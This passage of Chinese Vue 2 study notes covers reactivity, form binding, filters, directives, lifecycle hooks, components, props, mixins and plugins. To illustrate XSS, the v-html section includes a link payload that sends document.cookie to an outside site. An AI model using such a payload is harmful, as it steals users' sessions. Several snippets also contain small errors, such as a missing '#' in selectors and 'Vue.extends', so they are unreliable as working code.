					address:'北京',
				},
				student:{
					name:'tom',
					age:{
						rAge:40,
						sAge:29,
					},
					friends:[
						{name:'jerry',age:35},
						{name:'tony',age:36}
					]
				}
			},
			methods: {
				addSex(){
          //开始时vm中不存在sex属性,如果在加载之后后添加的属性就需要使用一下方法,否则无get,set
					// Vue.set(this.student,'sex','男')
					this.$set(this.student,'sex','男')
				}
			}
		})
```

# vue检测数据改变的原理_数组

vue无法监测到通过赋值的方法直接修改数组元素改变

```html
<div id="root">
  <h2>人员列表</h2>
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(p,index) of persons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    persons:[
      {id:'001',name:'马冬梅',age:30,sex:'女'},
      {id:'002',name:'周冬雨',age:31,sex:'女'},
      {id:'003',name:'周杰伦',age:18,sex:'男'},
      {id:'004',name:'温兆伦',age:19,sex:'男'}
    ]
  },
  methods: {
    updateMei(){
      // this.persons[0].name = '马老师' //奏效
      // this.persons[0].age = 50 //奏效
      // this.persons[0].sex = '男' //奏效
      // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
      this.persons.splice(0,1,{id:'001',name:'马老师',age:50,sex:'男'})
      vue.set(this._data.persons,1,{})//通过set方法修改数组中的元素
    }
  }
})
```

# 总结vue监视数据

1. vue会监视data中所有层次的数据
2. 如何监测对象中的数据:通过setter实现监视，且要在new Vue时就传入要监测的数据
   1. 对象中后追加的属性，Vue默认不做响应式处理
   2. 如需给后添加的属性做响应式，请使用如下API：
      1. `Vue.set(target，propertyName/index，value)`
      2. `vm.$set(target，propertyName/index，value)`
3. 如何监测数组中的数据:通过包裹数组更新元素的方法实现，本质就是做了两件事
   1. 调用原生对应的方法对数组进行更新
   2. 重新解析模板，进而更新页面
4. 在Vue修改数组中的某个元素一定要用如下方法：
   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set() 或 vm.$set()
5. 特别注意：Vue.set() 和 vm.$set()不能给vm或vm的根数据对象添加属性！！！

# vue接收表单数据

收集表单数据:

1. 若：`<input type="text"/>`，则`v-model`收集的是`value`值，用户输入的就是`value`值
2. 若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值
3. 若：`<input type="checkbox"/>`
   1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
   2. 配置input的value属性:
      1. v-model的初始值是非数组，那么收集的就是checked（勾选or 未勾选，是布尔值）
      2. v-model的初始值是数组，那么收集的的就是value组成的数组
4. 备注：v-model的三个修饰符:
   1. lazy：失去焦点再收集数据
   2. number：输入字符串转为有效的数字
   3. trim：输入首尾空格过滤

```html
<div id="test">
  <label for="demo">账号:</label><!-- 点击账号:会跳转到id:demo的输入框 -->
  <input type="text" id="demo">
</div>
<div id="root">
  <form @submit.prevent="demo">
    账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/><!-- .trim:去除空格 -->
    密码：<input type="password" v-model="userInfo.password"> <br/><br/>
    年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/><!-- type="number":设置只能输入number类型的值,.number:类型转换 -->
    性别：
    男<input type="radio" name="sex" v-model="userInfo.sex" value="male"><!-- name:添加分组,同在一个分组的type="radio"只能勾选一个 -->
    女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
    爱好：
    学习<input type="checkbox" v-model="userInfo.hobby" value="study">
    打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
    吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
    <br/><br/>
    所属校区
    <select v-model="userInfo.city">
      <option value="">请选择校区</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="shenzhen">深圳</option>
      <option value="wuhan">武汉</option>
    </select>
    <br/><br/>
    其他信息：
    <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/><!-- .lazy:失去焦点的时候再收集值 -->
    <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
    <button>提交</button><!-- button:默认的type值是submit -->
  </form>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    userInfo:{
      account:'',
      password:'',
      age:18,
      sex:'female',
      hobby:[],
      city:'beijing',
      other:'',
      agree:''
    }
  },
  methods: {
    demo(){
      console.log(JSON.stringify(this.userInfo))
    }
  }
})
```

# 过滤器

过滤器:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）

1. 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
2. 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
3. 过滤器也可以接收额外参数、多个过滤器也可以串联
4. 过滤器并没有改变原本的数据, 是产生新的对应的数据

```html
<div id="root">
  <h2>显示格式化后的时间</h2>
  <!-- 计算属性实现 -->
  <h3>现在是：{{fmtTime}}</h3>
  <!-- methods实现 -->
  <h3>现在是：{{getFmtTime()}}</h3>
  <!-- 过滤器实现 -->
  <h3>现在是：{{time | timeFormater}}</h3>
  <!-- 过滤器实现（传参） -->
  <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
  <h3 :x="msg | mySlice">尚硅谷</h3>
</div>

<div id="root2">
  <h2>{{msg | mySlice}}</h2>
</div>
```

```javascript
//添加全局过滤器:全局过滤器要一个一个配置
Vue.filter('mySlice',function(value){//是filter而不是filters
  return value.slice(0,4)
})
```

```javascript
new Vue({
  el:'root',
  data:{
    time:1621561377603,//时间戳
    msg:'你好，尚硅谷'
  },
  computed: {
    fmtTime(){
      return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
    }
  },
  methods: {
    getFmtTime(){
      return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
    }
  },
  //局部过滤器
  filters:{
    timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
      // console.log('@',value)
      return dayjs(value).format(str)//这是外部插件的方法
    }
  }
})
new Vue({
  el:'root2',
  data:{
    msg:'hello,atguigu!'
  }
})
```

# v-text指令

学过的指令:

1. v-bind=: 单向绑定解析表达式, 可简写为 :xxx
2. v-model: 双向数据绑定
3. v-for: 遍历数组/对象/字符串
4. v-on   : 绑定事件监听, 可简写为@
5. v-if: 条件渲染（动态控制节点是否存在）
6. v-else: 条件渲染（动态控制节点是否存在）
7. v-show: 条件渲染 (动态控制节点是否展示)

```html
<div id="root">
  <div>你好，{{name}}</div>
<div v-text="name">你好,{{name}}</div>
<div v-text="str"></div>
</div>
```

```javascript
//v-text:向其所在的节点中渲染文本内容,与插值语法的区别是v-text会替换掉节点中的内容,{{xx}}则不会
new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    str:'<h3>你好啊！</h3>'//v-text无法解析
  }
})
```

# v-html指令

v-html指令:向指定节点中渲染包含html结构的内容

1. 与插值语法的区别：
   1. v-html会替换掉节点中所有的内容，{{xx}}则不会
   2. v-html可以识别html结构
2. 严重注意:v-html有安全性问题
   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
   2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上

```html
<div id="root">
  <div>你好，{{name}}</div>
  <div v-html="str"></div>
  <div v-html="str2"></div>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    str:'<h3>你好啊！</h3>',
    str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了,快来！</a>'
  }
})
```

![](D:\OneDrive\Vue\1\41.cookie的缓存原理.png)

# v-cloak指令

v-cloak指令（没有值）:会隐藏带有v-cloak属性的标签

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题

```html
<div id="root">
  <h2 v-cloak>{{name}}</h2>
</div>
```

```javascript
// 除了在<head>中可以引入script标签外,还可以在body中的最后一行引入
// 延时获得vue
<script type="text/javascript" src="http://localhost:5s/vue.js"></script>
new Vue({
  el:'root',
  data:{ 
    name:'尚硅谷'
  }
})
```

# v-once指令

v-once指令:

1. v-once所在节点在初次动态渲染后，就视为静态内容了
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

```html
<div id="root">
  <h2 v-once>初始化的n值是:{{n}}</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    n:1
  }
})
```

# v-pre指令

v-pre指令:

1. 跳过指令所在节点的编译过程
2. 可跳过:没有使用指令语法、没有使用插值语法的节点，能够加快编译

```html
<div id="root">
  <h2 v-pre>Vue其实很简单</h2>
  <h2 >当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    n:1
  }
})
```

# 自定义指令1

# 自定义指令2

# 自定义指令3

1. 自定义指令:分为局部指令和全局指令
2. 自定义指令函数会接受两个参数:
   1. `DOM`元素
   2. 一个包含了许多属性,如绑定值,指令名的对象
3. 配置对象中常用的3个回调:
   1. `.bind`：指令与元素成功绑定时调用
   2. `.inserted`：指令所在元素被插入页面时调用
   3. `.update`：指令所在模板结构被重新解析时调用
4. 备注:
   1. 定义指令时不加v-，但使用时要加v-
   2. 指令名如果是多个单词，要使用`kebab-case`命名方式，不要用`camelCase`形式的小驼峰命名

```html
<!-- 需求1:定义v-big指令，和v-text功能类似，但会把绑定的数值放大10倍 -->
<!-- 需求2：定义v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点 -->
<div id="root">
  <h2>{{name}}</h2>
  <h2>当前的n值是：<span v-text="n"></span> </h2>
  <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span></h2> -->
  <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
  <button @click="n++">点我n+1</button>
  <hr/>
  <input type="text" v-fbind:value="n">
</div>
```

```javascript
//定义全局指令
Vue.directive('fbind',{
  //指令与元素成功绑定时（一上来）
  bind(element,binding){
    element.value = binding.value
  },
  //指令所在元素被插入页面时
  inserted(element,binding){
    element.focus()
  },
  //指令所在的模板被重新解析时
  update(element,binding){
    element.value = binding.value
  }
})
```

```javascript
//定义局部指令
new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    n:1
  },
  directives:{
    //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
    /* 
    当指令名包含符号时应使用引号包裹变量名
    'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
		 }, 
		*/
    big(element,binding){
      console.log('big',this) //注意此处的this是window
      // console.log('big')
      element.innerText = binding.value * 10
    },
    fbind:{
      //指令与元素成功绑定时（一上来）
      bind(element,binding){
        element.value = binding.value
      },
      //指令所在元素被插入页面时
      inserted(element,binding){
        element.focus()
      },
      //指令所在的模板被重新解析时
      update(element,binding){
        element.value = binding.value
      }
    }
  }
})
```

# 引出生命周期

生命周期:

1. 又称生命周期回调函数、生命周期函数、生命周期钩子
2. 是`Vue`在关键的时间点帮我们调用的一些特殊名称的函数
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
4. 生命周期函数中的`this`指向是`vm`或组件实例对象

```html
<div id="root">
  <h2 v-if="a">你好啊</h2>
  <h2 :style="{opacity}">欢迎学习Vue</h2><!-- 完整写法:{opacity:opacity} -->
  <!-- 解析时,调用change函数,又因为change函数的返回值为undefined,所以页面不显示,但因为change()调用后,opacity一直在改变,而vue中当被使用的属性改变时,模板就会重新解析,导致调用change()函数无限循环下去 -->
  <h2>{{change}}</h2>
</div>
```

```javascript
//需求:使h2的文本内容虚化循环
new Vue({
  el: 'root',
  data: {
    a: false,
    opacity: 1
  },
  methods: {
    change() {
      setInterval(() => {
        this.opacity -= 0.01
        if (this.opacity <= 0) this.opacity = 1
      }, 16)
    }
  },
  //Vue完成模板的解析并把初始的真实DOM元素放入页面后(即页面中第一次开始渲染DOM元素的时候,再之后页面修改DOM元素只是更新页面不会重新再调用挂载)（挂载完毕）调用mounted;
  mounted() {
    console.log('mounted', this)
    setInterval(() => {
      this.opacity -= 0.01
      if (this.opacity <= 0) this.opacity = 1
    }, 16)
  },
})
//通过外部的定时器实现DOM虚化循环（不推荐）
/* setInterval(() => {
			vm.opacity -= 0.01
			if(vm.opacity <= 0) vm.opacity = 1
	 },16) */
```

# 生命周期_挂载流程

# 生命周期_更新流程

# 生命周期_销毁流程

```html
<div id="root" :x="n">
  <h2 v-text="n"></h2>
  <h2>当前的n值是：{{n}}</h2>
  <button @click="add">点我n+1</button>
  <button @click="bye">点我销毁vm</button>
</div>
```

```javascript
new Vue({
  el:'root',
  // template:`//template:会将容器中的所有标签替换掉
  // 	<div> 
  // 		<h2>当前的n值是：{{n}}</h2> //如果h2与button外不包一个根标签div,则会报错
  // 		<button @click="add">点我n+1</button>
  // 	</div>
  // `,
  data:{
    n:1
  },
  methods: {
    add(){
      console.log('add')
      this.n++
    },
    bye(){
      console.log('bye')
      this.$destroy()
    }
  },
  watch:{
    n(){
      console.log('n变了')
    }
  },
  beforeCreate() {
    console.log('beforeCreate')
    //debugger;希望在哪个节点暂停必须通过debugger(打断点),并且页面时要重新刷新一遍才可以
  },
  created() {
    console.log('created')
  },
  beforeMount() {
    console.log('beforeMount')
  },
  mounted() {
    console.log('mounted',this.$el instanceof HTMLElement)//判断this.$el是不是真实的DOM元素
  },
  beforeUpdate() {
    console.log('beforeUpdate')
  },
  updated() {
    console.log('updated')
  },
  beforeDestroy() {//此阶段所有对数据的更改都不会触发页面更新了
    console.log('beforeDestroy')
    this.add//在此阶段调用了方法之后,虽然该方法会被执行,即console.log会输出"add"并且n++,但是此阶段的对数据的所有操作都不触发更新
  },
  destroyed() {
    console.log('destroyed')
  },
})
```

# 生命周期总结

常用的生命周期钩子:

1. mounted:发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】
2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】

关于销毁vue实例:

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后自定义事件会失效，但原生DOM事件依然有效
3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了

![](D:\OneDrive\Vue\1\52.生命周期原理图.png)

![52.生命周期原理图1](D:\OneDrive\Vue\1\52.生命周期原理图1.png)

```html
<div id="root">
  <h2 :style="{opacity}">欢迎学习Vue</h2>
  <button @click="opacity = 1">透明度设置为1</button>
  <button @click="stop">点我停止变换</button>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    opacity:1
  },
  methods: {
    stop(){
      this.$destroy()
    }
  },
  //Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
  mounted(){
    console.log('mounted',this)
    this.timer = setInterval(() => {
      console.log('setInterval')
      this.opacity -= 0.01
      if(this.opacity <= 0) this.opacity = 1
    },16)
  },
  beforeDestroy() {
    clearInterval(this.timer)
    console.log('vm即将驾鹤西游了')
  },
})
```

# 对组件的理解

组件的定义:实现应用中局部功能代码和资源的集合,文件容易维护且依赖关系简单

# 非单文件组件

非单文件组件:一个文件中包含有多个组

单文件组件:一个文件中只包含有一个组件`a.vue`

`vue`中使用组件的步骤:

1. 定义组件(创建组件)
   1. 使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的`options`几乎一样，但稍有区别
   2. 区别:
      - `el`不要写 —— 最终所有的组件都要经过一个`vm`的管理，由`vm`中的`el`决定服务哪个容器
      - `data`必须写成函数 —— 避免组件被复用时,数据存在引用关系,导致某个网页修改数据后,所有网页的数据都变动
2. 注册组件:
   - 局部注册：在`new Vue`的时候传入`components`选项
   - 全局注册：`Vue.component('组件名',组件)`
3. 使用组件(写组件标签):`<school></school>`

```html
<div id="root">
  <hello></hello>
  <hr>
  <h1>{{msg}}</h1>
  <hr>
  <!-- 第三步：编写组件标签 -->
  <school></school>
  <hr>
  <!-- 第三步：编写组件标签 -->
  <student></student>
  <student></student>
</div>
<div id="root2">
  <hello></hello>
</div>
```

```javascript
//第一步:创建school组件
const school = Vue.extend({
  template:`
  	<div class="demo">
  		<h2>学校名称：{{schoolName}}</h2>
  		<h2>学校地址：{{address}}</h2>
  		<button @click="showName">点我提示学校名</button>	
  	</div>
  `,
  // el:'root', //组件定义时，不能写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
  data(){//函数表达式写法
    return {
      schoolName:'尚硅谷',
      address:'北京昌平'
    }
  },
  methods: {
    showName(){
      alert(this.schoolName)
    }
  },
})
//第一步：创建student组件
const student = Vue.extend({
  template:`
          <div>
            <h2>学生姓名：{{studentName}}</h2>
            <h2>学生年龄：{{age}}</h2>
          </div>
        `,
  data(){
    return {
      studentName:'张三',
      age:18
    }
  }
})
//第一步：创建hello组件
const hello = Vue.extend({
  template:`
          <div>	
            <h2>你好啊！{{name}}</h2>
          </div>
        `,
  data(){
    return {
      name:'Tom'
    }
  }
})
//第二步：全局注册组件
Vue.component('hello',hello)
//创建vm
new Vue({
  el:'root',
  data:{
    msg:'你好啊！'
  },
  //第二步：注册组件（局部注册）
  components:{
    school,
    student
  }
})
new Vue({
  el:'root2',
})
```

# 组件的几个注意点

1. 关于组件名:
   1. 一个单词组成：
      - 首字母小写:`school`
      - 首字母大写:`School`
   2. 多个单词组成：
      - `kebab-case`：`my-school`
      - `CamelCase`：`MySchool`(大驼峰命名:需要Vue脚手架支持)
   3. 备注：
      - 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行
      - 可以使用`name`配置项指定组件在开发者工具中呈现的名字
2. 关于组件标签:
   1. `<school></school>`
   2. `<school/>`
   3. 不用使用脚手架时，`<school/>`自闭合标签会导致多余的后续组件不能渲染
3. 简写方式：`const school = Vue.extend(options)`可简写为：`const school = options`	

```html
<div id="root">
  <h1>{{msg}}</h1>
  <school/
</div>
```

```javascript
const s = Vue.extend({
  name:'atguigu',
  template:`
		<div>
			<h2>学校名称：{{name}}</h2>	
			<h2>学校地址：{{address}}</h2>	
		</div>
	`,
  data(){
    return {
      name:'尚硅谷',
      address:'北京'
    }
  }
})
new Vue({
  el:'root',
  data:{
    msg:'欢迎学习Vue!'
  },
  components:{
    school:s
  }
})
```

# 组件的嵌套

App组件:`App.vue`被vm实例管理,同时它也是其它所有组件的父组件

```html
<div id="root"></div>
```

```javascript
//定义student组件
const student = Vue.extend({
  name:'student',
  template:`
		<div>
			<h2>学生姓名：{{name}}</h2>	
			<h2>学生年龄：{{age}}</h2>	
		</div>
		`,
  data(){
    return {
      name:'尚硅谷',
      age:18
    }
  }
})
//定义school组件
const school = Vue.extend({/* 子组件嵌套[24] */
  name:'school',
  template:`
		<div>
			<h2>学校名称：{{name}}</h2>	
			<h2>学校地址：{{address}}</h2>	
			<student></student> 
		</div>
	`,
  data(){
    return {
      name:'尚硅谷',
      address:'北京'
    }
  },
  //注册组件(局部)
  components:{
    student
  }
})
//定义app组件
const app = Vue.extend({
  template:`
		<div>	
			<school></school>
		</div>
	`,
  components:{
    school
  }
})
//创建vm
new Vue({
  template:'<app></app>',
  el:'root',
  //注册组件（局部）
  components:{app}
})
```

# VueComponent构造函数

1. School组件本质是一个名为``VueComponent`的构造函数,且不是程序员定义的，是`Vue.extend()`生成的。
2. 只需要写`<school/>`或`<school></school>`，Vue解析时会自动创建school组件的实例对象，即Vue自动执行：`new VueComponent(options)`
3. 特别注意：每次调用`Vue.extend()`，返回的都是一个全新的`VueComponent`构造函数！
4. 关于this指向：
   - 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是`VueComponent`实例对象
   - `new Vue(options)`配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是`Vue`实例对象
5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）;Vue的实例对象，以后简称vm

```html
<div id="root">
  <school></school>
  <school></school>
  <hello></hello>
</div>
```

```javascript
//定义school组件
const school = Vue.extend({
  name: 'school',
  template: `
		<div>
			<h2>学校名称：{{name}}</h2>	
			<h2>学校地址：{{address}}</h2>	
			<button @click="showName">点我提示学校名</button>
		</div>
	`,
  data() {
    return {
      name: '尚硅谷',
      address: '北京'
    }
  },
  methods: {
    showName() {
      console.log('showName', this)
    }
  },
})
const test = Vue.extend({
  template: `<span>atguigu</span>`
})
//定义hello组件
const hello = Vue.extend({
  template: `
		<div>
      <h2>{{msg}}</h2>
			<test></test>	
		</div>
	`,
  data() {
    return {
      msg: '你好啊！'
    }
  },
  components: { test }
})
//创建vm
const vm = new Vue({
  el: 'root',
  components: { school, hello }
})
```

# vue实例与组件实例

`VueCompoment`的实例对象即组件的实例对象是可以复用的Vue实例对象,但与vue实例对象还是有差别的

# 一个重要的内置关系

1. 一个重要的内置关系：`VueComponent.prototype.__proto__ === Vue.prototype`
2. 这个关系让组件实例对象（vc）可以访问到Vue原型上的属性、方法

![](D:\OneDrive\Vue\1\59.一个重要的内置关系.png)

```html
<div id="root">
  <school></school><!-- 相当与:new VueCompoment() -->
</div>
```

```javascript
Vue.prototype.x = 99
//定义school组件
const school = Vue.extend({
  name:'school',
  template:`
		<div>
			<button @click="showX">点我输出x</button>
		</div>
	`,
  methods: {
    showX(){
      console.log(this.x === vm.x)//true
    }
  },
})
//创建一个vm
const vm = new Vue({
  el:'root',
  components:{school}
})
```

# 单文件组件

单文件组件构成:`index.html`->`main.js`->`App.vue`->`School.vue`

vue组件的name属性:在全局注册下,全局ID自动作为组件的name,且有名字的组件在开发者工具中会被更好的显示

```html
<!-- index.html和main.js -->
<script type="module" src="./60.2.main.js"></script>
<div id="root"></div>
<script>
  import Vue from 'vue' //首先需要引入vue
  import App from  './60.3.单文件组件_app.vue'//因为浏览器无法直接支持ES6语法,所以此行如在非脚手架环境下使用将会报错
  new Vue({
    el:'root',
    template:`<App></App>`,
    components:{App},
  })
</script>
```

```vue
<!-- App.vue -->
<template>
	<div>
		<School></School>
	</div>
</template>
<script>
	//引入组件
	import School from './60.4.单文件组件_school.vue'
	//默认暴露方法暴露组件
	export default Vue.extends({
		name:'App',
		components:{
			School
		}
	})
</script>
```

```vue
<!-- School.vue -->
<template>
<div class="demo">
  <h2>学校名称：{{name}}</h2>
  <h2>学校地址：{{address}}</h2>
  <button @click="showName">点我提示学校名</button>	
  </div>
</template>
<script>
  export default Vue.extends({//脚手架下可再简写:export default (options)
    name:'School',
    data(){
      return {
        name:'尚硅谷',
        address:'北京昌平'
      }
    },
    methods: {
      showName(){
        alert(this.name)
      }
    },
  })
</script>
<style>
  .demo{
    background-color: orange;
  }
</style>
```

# 插件vue脚手架

1. `vue.cli`:在cmd下全局安装脚手架
2. 配置npm淘宝镜像加快下载速度:`npm config set registry https://registry.npm.taobao.org`
3. 全局安装脚手架:`npm install -g @vue/cli`
4. 切换到要创建项目的目录,然后创建项目:`vue create app-name`
5. 启动项目:`npm run serve`
6. `vue.cli`最终会在本地自动创建一个小型服务器端`http://localhost:8080`

# 分析脚手架架构

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

```html
<meta http-equiv="X-UA-Compatible" content="IE=edge"><!-- 针对IE浏览器的特殊配置,含义是让IE浏览器以最高的渲染级别渲染页面 -->
<meta http-equiv="viewport" content="width=device-width,initial-scale=1.0"><!-- 开启移动端的理想视口 -->
<link rel="icon" href="<%= BASE_URL %>favicon.ico"><!-- 配置页签图标 -->
<title><%= htmlWebpackPlugin.options.title %></title><!-- 配置网页标题 -->

<noscript><!-- 当浏览器不支持js时,noscript标签中的元素就会被渲染 -->
	<strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
</noscript>
<div id="app"></div>
```

```javascript
//D:\OneDrive\Vue\1\maaya\src\main.js

import { createApp } from 'vue'//引入vue
import App from './App.vue'//引入App组件,他是所有组件的父组件

//创建vue实例对象vm,
createApp(App).mount('app')//.mount("app")相当于:el:"app"
```

# render函数

1. `vue.js`与``vue.runtime.xxx.js`的区别：
   1. `vue.js`是完整版的Vue，包含：核心功能+模板解析器。
   2. `vue.runtime.xxx.js`是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为`vue.runtime.xxx.js`没有模板解析器，所以不能使用`template`配置项，需要使用`render`函数接收到的`createElement`函数去指定具体内容。 

```javascript
import { createApp } from 'vue' //此处引入的vue是残缺版的vue,完整的应为vue/vue.js
import App from './App.vue'

createApp(App).mount('app')

//vue-cli3
new vue({
  el:"root",
  //箭头函数的简写形式:render函数中可以传入参数,这个参数是一个函数,这个函数中传入标签和标签的内容,即可在页面上渲染出来
  render:createElement => createElement("h1","你好")
})
//vue-cli2
new vue({
  el:"root",
  render:p => p(App)
})
//不使用完整版的vue是因为项目开发时需要模板解析器的功能解析模板,但在开发完成后已经将vue转换成了js文件,此处为举例不是非常正确,所以用精简版的vue可以节约最终打包的体积
//render函数只针对vm中的template,其余vc中的template标签则不会
```

# 修改默认配置

1. `Vue`脚手架隐藏了所有`webpack`相关的配置,若想查看具体的`webpack`配置请执行:`vue inspect > output.js`
2. `output.js`只能查看,对它的修改无法生效,因此需要在`src`和`public`的同级目录下创建`vue.config.js `,来对脚手架进行个性化定制
3. 在`vue.config.js`中的对象中创建属性`lintOnSave:fasle`,可以关闭语法检查

# ref属性

1. 被用来给元素或子组件注册引用信息（`id`的替代者）
2. 应用在`html`标签上获取的是真实`DOM`元素，应用在组件标签上是组件实例对象`vc`
3. 使用方式:
   1. 打标识：`<h1 ref="xxx"></h1>`或`<School ref="xxx"></School>`
   2. 获取`this.$refs.xxx`

```vue
<template>
<div>
  <h1 v-text="msg" ref="title"></h1>
  <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
  <School ref="sch"/>
  </div>
</template>
<script>
  import School from './components/School'
  export default Vue.extends({
    name:'App',
    components:{School},
    data() {
      return {
        msg:'欢迎学习Vue！'
      }
    },
    methods: {
      showDOM(){
        console.log(this.$refs.title) //获得真实DOM元素
        console.log(this.$refs.btn) //获得真实DOM元素
        console.log(this.$refs.sch) //获得School组件的实例对象（vc）
        //console.log(document.getElementById("sch")); [5]中的ref改为id,那么获得的就是School的template内容
      }
    },
  })
</script>
```

# prop属性

1. prop属性:让组件接收外部传入的数据
2. 传递数据：`<Demo name="xxx"/>`
3. 接收数据:
   1. 只接收：`props:['name']`
   2. 限制接收类型：`props:{name:String}`
   3. 限制类型、限制必要性、指定默认值:`prop:{name:{type:String,required:true,default:99}}`

```vue
<!-- App.vue -->
<template>
	<div>
		<Student name="李四" sex="女" :age="18"/><!-- 通过v-bind动态绑定则="18"中的18是一个表达式,所以他是number类型的值 -->
	</div>
</template>
<script>
	import Student from './66.student.vue'
	export default {
		name:'App',
		components:{Student}
	}
</script>
```

```vue
<!-- Student.vue -->
<template>
<div>
  <h1>{{msg}}</h1>
  <h2>学生姓名：{{name}}</h2>
  <h2>学生性别：{{sex}}</h2>
  <h2>学生年龄：{{myAge+1}}</h2>
  <button @click="updateAge">尝试修改收到的年龄</button>
  </div>
</template>
<script>
  export default {
    name:'Student',
    data() {
      console.log(this)
      return {
        msg:'我是一个尚硅谷的学生',
        myAge:this.age
      }
    },
    methods: {
      updateAge(){
        this.myAge++//通过this.age直接年龄,虽然能够成功,但是子改父控制台会报错
      }
    },
    //1.简单声明接收
    // props:['name','age','sex'] 

    //2.接收的同时对数据进行类型限制:虽然不符合接受类型的数据还是会被渲染,但会在控制台提示
    /* props:{
    	 	 name:String,
    	 	 age:Number,
    	 	 sex:String
    } */

    //3.接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
    props:{
      name:{
        type:String, //name的类型是字符串
        required:true, //name是必要的
      },
      age:{
        type:Number,
        default:99 //默认值
      },
      sex:{
        type:String,
        required:true
      }
    }
  }
</script>
```

# mixin混入

`mixin`混入功能：可以把多个组件共用的配置提取成一个混入对象
1.定义混入：
2.使用混入：全局混入,局部混入

```javascript
//main.js
import Vue from 'vue'
import App from './App.vue'
import {hunhe,hunhe2} from './mixin.js' //将创建的mixin.js文件引入

Vue.mixin(hunhe)//全局混入
Vue.mixin(hunhe2)

//创建vm
new Vue({
  el:'app',
  render: h => h(App)
})
```

```javascript
//mixin.js
export const hunhe = {
	methods: {
		showName(){
			alert(this.name)
		}
	},
	mounted() {
		console.log('你好啊！')
	},
}
export const hunhe2 = {
	data() {
		return {
			x:100,
			y:200
		}
	},
}

```

```vue
<!-- School.vue -->
<template>
	<div>
		<h2 @click="showName">学校名称：{{name}}</h2><!-- 使用minxin的方法 -->
		<h2>学校地址：{{address}}</h2>
	</div>
</template>
<script>
	// 引入一个hunhe
	import {hunhe,hunhe2} from '../mixin'
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
				x:666
			}
		},
		mixins:[hunhe,hunhe2]//局部混入
	}
</script>
```

# 插件

1. 功能：用于增强`Vue`
2. 本质：包含`install`方法的一个对象，`install`的第一个参数是`Vue`，第二个以后的参数是插件使用者传递的数据
3. 使用插件：在引入插件之后还需要`Vue.use()`来使用

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import plugins from './plugins'
//关闭Vue的生产提示
Vue.config.productionTip = false
//应用（挂载）插件:插件被应用之后,install里面的代码就会按顺序执行
Vue.use(plugins,1,2,3)
//创建vm
new Vue({
